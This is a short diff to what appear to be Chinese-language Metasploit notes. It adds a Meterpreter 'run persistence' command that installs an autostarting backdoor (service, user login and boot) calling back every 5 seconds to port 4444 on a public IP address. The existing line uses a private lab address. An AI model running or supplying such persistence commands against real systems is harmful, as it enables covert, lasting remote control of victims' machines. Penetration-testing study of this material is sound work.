@@ -38,6 +38,7 @@ run persistence -h
     -r   运行Metasploit监听连接的系统的IP
 
 run persistence -S -U -X -i 5 -p 6666 -r 192.168.190.141
+run persistence -S -U -X -i 5 -p 4444 -r 47.95.141.60
 
 
 
